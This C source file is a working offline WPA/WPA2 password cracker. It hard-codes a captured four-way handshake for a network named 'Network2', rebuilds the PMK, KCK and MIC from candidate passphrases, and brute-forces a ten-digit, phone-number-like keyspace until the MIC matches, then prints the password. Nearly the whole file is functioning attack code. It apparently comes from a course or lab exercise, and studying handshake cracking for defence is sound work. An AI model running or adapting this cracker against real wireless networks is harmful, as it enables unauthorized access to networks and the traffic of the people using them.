#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "wpa.h"
#include "hmac.h"
#include "pbkdf2.h"
#include "sha1.h"

#define SSID "Network2"
#define AP_MAC "\215HFm\004\325"
#define CLIENT_MAC "<\227\214\325\347\234"
#define CLIENT_NONCE "\323\252\2243\265\324\216\367\203\363\200\257@\024\345Kw\327c\322\v\247\221__<\bSI\305i\354"
#define SERVER_NONCE "Y\312_?X\031\327\371\026\372$\352\330\277f\333\003pw\346\310\346,86\305\227A\377|\005\177"
#define EMPTY_MIC "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#define SECOND_HANDSHAKE_PACKET "\001\003\000u\002\001\n\000\000\000\000\000\000\000\000\000\001\323\252\2243\265\324\216\367\203\363\200\257@\024\345Kw\327c\322\v\247\221__<\bSI\305i\354\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000\000~p\004\252~\256\361\000\004\205\304f\205cTH\000\0260\024\001\000\000\017\254\004\001\000\000\017\254\004\001\000\000\017\254\002\200\000"
#define SECOND_HANDSHAKE_PACKET_LENGTH 121
#define TRAGET_MIC "~p\004\252~\256\361\000\004\205\304f\205cTH"

#define BUFF_LEN 256

/* constant salt used in the algorithm ('A') */
#define CONST_A_SALT "Pairwise key expansion"
#define CONST_A_SALT_LENGTH strlen("Pairwise key expansion")


void calc_dynamic_B_salt(const char *client_mac, const char *server_mac,
                         const char *client_nonce, const char *server_nonce,
                         char *dynamic_B_salt) {
  /**
   * calculates the dynamic salt used in the algorithm ('B')
   * the calculation performed is:
   * B = min(server_mac, client_mac) || max(server_mac, client_mac) ||
   * min(client_nonce, server_nonce) || max(client_nonce, server_nonce)
   *
   * @param client_mac: the client's mac address
   * @param server_mac: the server's mac address
   * @param client_nonce: client nonce
   * @param server_nonce: server nonce
   * @param dynamic_B_salt: pointer to a buffer to output the B salt in
   *
   */

  /* zero buffer before use */
  memset(dynamic_B_salt, 0, SALT_LENGTH);

  /* min(server_mac, client_mac) || max(server_mac, client_mac) */
  if (memcmp(client_mac, server_mac, MAC_LENGTH) <= 0) {
    memcpy(dynamic_B_salt, client_mac, MAC_LENGTH);
    memcpy(dynamic_B_salt + MAC_LENGTH, server_mac, MAC_LENGTH);
  } else {
    memcpy(dynamic_B_salt, server_mac, MAC_LENGTH);
    memcpy(dynamic_B_salt + MAC_LENGTH, client_mac, MAC_LENGTH);
  }

  /* min(client_nonce, server_nonce) || max(client_nonce, server_nonce) */

  if (memcmp(client_nonce, server_nonce, NONCE_LENGTH) <= 0) {
    memcpy(dynamic_B_salt + 2 * MAC_LENGTH, client_nonce, NONCE_LENGTH);
    memcpy(dynamic_B_salt + 2 * MAC_LENGTH + NONCE_LENGTH, server_nonce, NONCE_LENGTH);
  } else {
    memcpy(dynamic_B_salt + 2 * MAC_LENGTH, server_nonce, NONCE_LENGTH);
    memcpy(dynamic_B_salt + 2 * MAC_LENGTH + NONCE_LENGTH, client_nonce, NONCE_LENGTH);
  }
}

void calc_kck_by_custom_PRF512(const char *pmk, const char *dynamic_B_salt,
                               char *kck) {
  /**
   * calculates the KCK by using a custom PRF512 algorithm. The kck is
   * calculated from the pmk and the two salts.
   *
   * @param pmk: the pmk
   * @param dynamic_B_salt: the dynamic salt, calculated by calc_dynamic_B_salt
   * @param kck: pointer to a buffer to output the kck in
   *
   */

  char buffer[4 * SHA_DIGEST_LENGTH] = {0};
  unsigned int len;

  /* we perform 4 iterations of HMAC */
  for (int i = 0; i < 4; i++) {
    char hmac_arg[256] = {0};

    /* we perform the HMAC on: const_A_salt || bytes(0) || dynamic_B_salt ||
     * bytes(i) */
    memcpy(hmac_arg, CONST_A_SALT, CONST_A_SALT_LENGTH);
    hmac_arg[CONST_A_SALT_LENGTH] = 0;
    memcpy(hmac_arg + CONST_A_SALT_LENGTH + 1, dynamic_B_salt, SALT_LENGTH);
    hmac_arg[CONST_A_SALT_LENGTH + SALT_LENGTH + 1] = i;

    /* calculate the HMAC, using sha1 */
    // HMAC(EVP_sha1(), pmk, PMK_LEN, hmac_arg, CONST_A_SALT_LEN + SALT_LENGTH + 2,
    //      buffer + i * SHA_DIGEST_LENGTH, &len);
    hmac_sha1((const char *)hmac_arg, CONST_A_SALT_LENGTH + SALT_LENGTH + 2,
              (const char *)pmk, PMK_LENGTH,
              (char *)(buffer + i * SHA_DIGEST_LENGTH));
  }

  /* copy final calculation to the ptk buffer given */
  memcpy(kck, buffer, KCK_LENGTH);
}

void calc_mic_from_kck(const char *kck, const char *second_handshake_eapol,
                       char *mic, int eapol_len) {
  /**
   * calculates the mic, from KCK and the second packet eapol layer from the four-way
   * handshake.
   *
   * @param kck: the KCK
   * @param second_handshake_eapol: the raw bytes of the eapol layer of the second packet from the
   * four way handshake
   * @param mic: pointer to a buffer to output the mic in
   * @param eapol_len: length of the second handshake packet
   *
   */
  char hmac_result[20]; // sha 1 length
  char hmac_arg[256] = {0};
  int mic_len;

  /* we perform the hmac on: second_packet[:81] || 0 * MIC_LENGTH ||
   * second_packet[97:] */
  memcpy(hmac_arg, second_handshake_eapol, 81);
  memcpy(hmac_arg + 81, EMPTY_MIC, MIC_LENGTH);
  memcpy(hmac_arg + 81 + MIC_LENGTH, second_handshake_eapol + 97, eapol_len - 97);

  hmac_sha1(hmac_arg, eapol_len, kck, MIC_LENGTH, hmac_result);
  memcpy(mic, hmac_result, MIC_LENGTH);
}

void calc_mic_from_passphrase(const char *ssid, const char *client_mac,
                              const char *server_mac, const char *client_nonce,
                              const char *server_nonce,
                              const int second_packet_length,
                              const char *second_handshake_eapol,
                              const char *passphrase, char *mic) {
  /**
   * calculates the mic from the input variables, outputs it using the provided
   * mic pointer
   *
   * @param ssid: the ssid
   * @param client_mac: the client's mac address
   * @param server_mac: the server's mac address
   * @param client_nonce: client nonce
   * @param server_nonce: server nonce
   * @param second_packet_length: the length (in bytes) of the second handshake
   * packet
   * @param second_handshake_eapol: the raw bytes of the eapol layer of the second packet from the
   * four way handshake
   * @param passphrase: passphrase to calculate mic for
   * @param mic: pointer to a buffer to output the mic in
   *
   */

  // prepare buffers
  char pmk[PMK_LENGTH];
  char kck[KCK_LENGTH];
  char dynamic_B_salt[SALT_LENGTH] = {0};

  // first, calculate the pmk
  pbkdf2_sha1(passphrase, strlen(passphrase), ssid, strlen(ssid),
              HMAC_SHA1_ITER, PMK_LENGTH, (char *)pmk);

  // Then, calculate the dynamic salt, B
  calc_dynamic_B_salt(client_mac, server_mac, client_nonce, server_nonce,
                      (char *)dynamic_B_salt);
  
  // Derive KCK from the pmk and salt
  calc_kck_by_custom_PRF512(pmk, dynamic_B_salt, kck);

  // Derive the mic from the KCK and raw, second handshake packet
  calc_mic_from_kck(kck, second_handshake_eapol, mic, second_packet_length);
}


int compare_mic(const char *target_mic, char *mic_to_check) {
    int i;
    for (i = 0; i < MIC_LENGTH; i++) {
        if (target_mic[i] != mic_to_check[i]) {
            return 0;
        }
    }

    return 1;
}


void find_password(const char *ssid, const char *client_mac,
                              const char *server_mac, const char *client_nonce,
                              const char *server_nonce,
                              const int second_packet_length,
                              const char *second_handshake_packet,
                              char *mic) {
    int read;
    char buffer[11];
    int buff_len = 11;

    // Iterate over all possible combinations of 8 digits
    for (int i = 0; i < 10000; i++) {
        // Format the number with leading zeros
        snprintf(buffer, sizeof(buffer), "054055%04d", i);
        buffer[10] = '\0';
        calc_mic_from_passphrase(SSID, CLIENT_MAC, AP_MAC, CLIENT_NONCE, SERVER_NONCE, SECOND_HANDSHAKE_PACKET_LENGTH, SECOND_HANDSHAKE_PACKET, buffer, mic);
        if (compare_mic(TRAGET_MIC, mic)) {
            printf("found password!\nThe password is: %s\n", buffer);
            return;
        }
    }

    perror("Couldn't find password\n");
}


int main() {
    char *mic = malloc(MIC_LENGTH);
    if (!mic) {
        perror("Error in malloc\n");
        return -1;
    }
    find_password(SSID, CLIENT_MAC, AP_MAC, CLIENT_NONCE, SERVER_NONCE, SECOND_HANDSHAKE_PACKET_LENGTH, SECOND_HANDSHAKE_PACKET, mic);
    free(mic);

    return 0;
}